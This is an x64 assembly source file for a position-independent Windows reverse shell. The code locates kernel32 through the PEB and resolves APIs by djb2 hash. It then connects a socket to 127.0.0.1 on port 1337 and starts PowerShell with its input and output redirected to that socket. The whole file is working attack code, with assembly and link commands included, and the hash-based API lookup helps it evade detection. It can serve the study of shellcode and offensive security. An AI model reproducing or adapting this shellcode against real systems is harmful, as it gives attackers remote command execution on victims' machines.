; Author: wizardy0ga
;
; This is a position independent reverse shell which
; connects back to localhost on port 1337.
;
; Assemble: nasm -f win64 pic-reverse-shell.x64.asm
; Link: link.exe /subsystem:console /entry:main pic-reverse-shell.x64.obj
; 
bits 64
default rel
global main

section .text

main:
    ; Step 1: Get VirtualAlloc function and create a buffer 
    ;         for memory operations such as structure population.
    ;
    sub rsp, 0x10            ; add 16 bytes to stack 8 for ntdll base addr & 8 for alignment
    mov rax, [gs:0x60]       ; rax = PEB
    mov rax, [rax + 0x18]    ; rax = PEB->LDR
    mov rax, [rax + 0x10]    ; rax = PEB->Ldr->InLoadOrderModuleList->Flink [this.exe]
    mov rax, [rax]           ; rax = LDR_DATA_TABLE_ENTRY, PEB->Ldr->InLoadOrderModuleList->Flink [ntdll.dll]
    mov rcx, [rax + 0x30]    ; rcx = Ntdll.dll base address
    mov qword [rsp + 0x10], rcx ; save ntdll base address for later 
    mov rax, [rax]           ; rax = LDR_DATA_TABLE_ENTRY, PEB->Ldr->InLoadOrderModuleList->Flink [kernel32.dll]
    mov rcx, [rax + 0x30]    ; rcx = (LDR_DATA_TABLE_ENTRY)Kernel32.DllBase
    mov rdx, 0x382C0F97      ; rdx = VirtualAlloc
    sub rsp, 0x28
    call getprocaddress      ; GetProcAddress(rcx=Kernel32.dll, rdx=VirtualAlloc)
    add rsp, 0x28
    mov r12, rcx             ; r12 = Kernel32.dll base address
    xor rcx, rcx             ; rcx = 0 (lpAddress)
    mov edx, 0x1000          ; edx = 0x1000 (dwSize)
    mov r8d, 0x1000          ; r8d = 0x1000 MEM_COMMIT
    or r8d, 0x2000           ; r8d = MEM_COMMIT | MEM_RESERVE (flAllocationType)
    mov r9d, 0x04            ; r9d = PAGE_READWRITE | lpProtect
    sub rsp, 0x28
    call rax                 ; VirtualAlloc
    mov r15, rax             ; r15 = VirtualAlloc buffer
    add rsp, 0x28
    
    ; Step 2: Load ws2_32.dll in the process
    ;
    mov rcx, r12             ; rcx = kernel32.dll base address
    mov rdx, 0x5FBFF0FB      ; rdx = LoadLibraryA
    sub rsp, 0x28
    call getprocaddress      ; GetProcAddress()
    add rsp, 0x28
    lea rcx, [ws2_32]        ; rcx = &"ws2_32.dll"
    sub rsp, 0x28
    call rax                 ; LoadLibraryA(rcx="ws2_32.dll")
    add rsp, 0x28

    ; Step 3: Locate and call WSAStartup to initialize the socket library
    ;
    mov rcx, rax             ; rcx = ws2_32.dll base address
    mov rdx, 0x6128C683      ; rdx = WSAStartup
    sub rsp, 0x28
    call getprocaddress      ; GetProcAddress(rcx=ws2_32.dll, rdx=WSAStartup)
    add rsp, 0x28
    mov r14, rcx             ; r14 = ws2_32.dll base address
    mov rcx, 0x0202          ; rcx = 0x0202
    mov rdx, r15             ; rdx = &WSData
    sub rsp, 0x28
    call rax                 ; WSAStartup(0x0202, &WSAData)             
    add rsp, 0x28
    
    ; Step 4: Create a new socket with WSASocketA
    ;
    mov rcx, r14             ; rcx = ws2_32.dll base address
    mov rdx, 0x559F159A      ; rdx = WSASocket
    sub rsp, 0x28
    call getprocaddress      ; GetProcAddress()
    add rsp, 0x28
    mov rcx, 0x02            ; rcx = 2 (af)
    mov edx, 0x1             ; rdx = 1 (type)
    mov r8d, 0x6             ; r8 = 6 (protocol)
    mov r9, 0                ; r9 = 0 (lpProtocolInfo)
    sub rsp, 0x28            ; Add shadow space, then add parameters
    mov dword [rsp + 0x20], 0; (g = 0)
    mov dword [rsp + 0x28], 0; (dwFlags = 0)
    call rax                 ; WSASocketA()
    add rsp, 0x28

    ; Step 5: Connect to the listener with WSAConnect
    ; 
    mov r13, rax             ; r13 = socket handle
    mov rcx, r14             ; rcx = ws2_32.dll base
    mov rdx, 0x86C3FA3A      ; rdx = WSAConnect
    sub rsp, 0x28
    call getprocaddress      ; GetProcAddress(ws2_32.dll, WSAConnect)
    add rsp, 0x28
    ;
    ; NOTE: WSAData struct in r15 is no longer needed. We wipe first 16 bytes for sockaddr_in struct.
    ;
    mov word [r15], 0x02                ; sockaddr_in.family member = AF_INET
    mov word [r15 + 0x02], 0x3905       ; sockaddr_in.port = 1337 (network byte order 0x3905)
    mov dword [r15 + 0x04], 0x0100007F  ; sockaddr_in.s_addr to 127.0.0.1 (network byte order 0x0100007F)
    mov rcx, r13                        ; rcx = socket handle (s)
    lea rdx, [r15]                      ; rdx = sockaddr_in   (*name)
    mov r8d, 0x10                       ; r8d = 16            (namelen)
    mov r9, 0                           ; r9 = 0              (lpCallerData)
    sub rsp, 0x28                       
    mov qword [rsp + 0x20], 0           ; lpCalleeData = 0
    mov qword [rsp + 0x28], 0           ; lpSQOS = 0
    mov qword [rsp + 0x30], 0           ; lpGQOS = 0
    call rax                            ; WSAConnect()
    add rsp, 0x28

    ; Step 6: Connect STARTUPINFOA structure to the network socket
    ;
    mov qword [r15], 0              ; Clear the first 32 bytes of the buffer. Skip 0x08 - 0x0F, bytes are empty.
    mov qword [r15 + 0x10], 0
    mov qword [r15 + 0x18], 0
    mov dword [r15], 0x68           ; STARTUPINFOA.cb = 108 bytes
    mov si, 0x0100                  ; si = STARTF_USESTDHANDLES
    or rsi, 0x01                    ; rsi = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    mov dword [r15 + 0x3C], esi     ; STARTUPINFOA.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    mov qword [r15 + 0x50], r13     ; STARTUPINFOA.hStdInput  = socket
    mov qword [r15 + 0x58], r13     ; STARTUPINFOA.hStdOutput = socket
    mov qword [r15 + 0x60], r13     ; STARTUPINFOA.hStdError  = socket

    ; Step 7: Locate & call CreateProcessA w/ STARTUPINFOA structure 
    ;         now redirecting i/o & error handles to socket.
    ;
    mov rcx, r12                    ; rcx = kernel32.dll base address
    mov rdx, 0xAEB52E19             ; rdx = CreateProcessA
    sub rsp, 0x28
    call getprocaddress             ; GetProcAddress(kernel32.dll, CreateProcessA)
    add rsp, 0x28
    xor rcx, rcx                    ; lpApplicationName = 0
    lea rdx, [proc]                 ; lpCommandLine = &"powershell"
    xor r8, r8                      ; lpProcessAttributes = 0
    xor r9, r9                      ; lpThreadAttributes = 0                   
    sub rsp, 0x58                   
    mov qword [rsp + 0x20], 0x01    ; bInheritHandles = TRUE
    mov qword [rsp + 0x28], 0       ; dwCreationFlags = 0
    mov qword [rsp + 0x30], 0       ; lpEnvironment = 0
    mov qword [rsp + 0x38], 0       ; lpCurrentDirectory = 0
    mov qword [rsp + 0x40], r15     ; lpStartupInfo = &STARTUPINFOA
    mov rsi, r15                    ; rsi = &STARTUPINFOA
    add rsi, 0x68                   ; rsi = &PROCESS_INFORMATION
    mov qword [rsp + 0x48], rsi     ; lpProcessInformation = &PROCESS_INFORMATION 
    call rax                        ; CreateProcessA()
    add rsp, 0x58

    ; Step 8: Cleanly exit the thread
    ;
    mov rcx, [rsp + 0x10]           ; rcx = ntdll.dll base address
    mov rdx, 0x8E492B88             ; rdx = RtlExitUserThread
    sub rsp, 0x28                 
    call getprocaddress             ; GetProcAddress
    xor rcx, rcx                    ; rcx = 0
    call rax                        ; RtlExitUserThread(0)
    ret


; __stdcall* GetProcAddress(HMODULE hModule, DWORD Hash)
;                           rcx   = hModule, rdx=Hash
getprocaddress:
    mov r11d, [rcx + 0x3C]  ; r11d = e_lfanew
    add r11, rcx            ; r11 = IMAGE_NT_HEADERS
    add r11, 0x88           ; r11 = IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
    mov r11d, [r11]         ; r11d = IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    add r11, rcx            ; r11 = IMAGE_EXPORT_DIRECTORY
    mov r10d, [r11 + 0x20]  ; r10d = IMAGE_EXPORT_DIRECTORY.AddressOfNames RVA
    add r10, rcx            ; r10 = Function Name Address array
.get_next_function_name:
    mov eax, 0x1505         ; eax = 0x1505 (hash seed)
    mov r9d, [r10 + rdi * 4]; r9d = Function Name RVA
    add r9, rcx             ; r9 = Function Name
    xor rsi, rsi            ; rsi = 0
.djb2_hash:
    mov sil, [r9]           ; sil = &TargetFunc[i]
    cmp sil, 0              ; check for null terminator. hash complete if true
    je .hash_complete
    mov r8d, eax            ; preserve hash from previous result
    shl eax, 5              ; eax = (hash << 5)
    add eax, r8d            ; eax = ((hash << 5) + hash)
    add eax, esi            ; eax = ((hash << 5) + hash) + char
    inc r9                  ; increment pointer to next byte in string
    jmp .djb2_hash
.hash_complete:
    cmp rax, rdx            ; Check if function hash matches hash parameter
    je .found_function
    cmp edi, [r11 + 0x14]   ; Check if current function index is == IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
    je .end_of_exports
    inc rdi                 ; Continue to next function
    jmp .get_next_function_name
.end_of_exports:
    xor rax, rax
    ret
.found_function:
    mov eax, [r11 + 0x24]    ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfOrdinals RVA
    add rax, rcx             ; rax = Ordinals Array base
    mov si, [rax + rdi * 2]  ; si = Function Ordinal
    mov eax, [r11 + 0x1C]    ; eax = IMAGE_EXPORT_DIRECTORY.AddresssOfFunctions RVA
    add rax, rcx             ; rax = Function Address Array base
    mov eax, [rax + rsi * 4] ; eax = Function Address RVA
    add rax, rcx             ; rax = Function Address
    xor rsi, rsi             ; rsi = 0 - Clean rsi & rdi indexes for next call usage. 
                             ;           Caller must clean otherwise calling getprocaddress again breaks due to invalid indices. 
    xor rdi, rdi             ; rdi = 0
    ret

ws2_32:
    db "ws2_32.dll", 0

proc:
    db "powershell", 0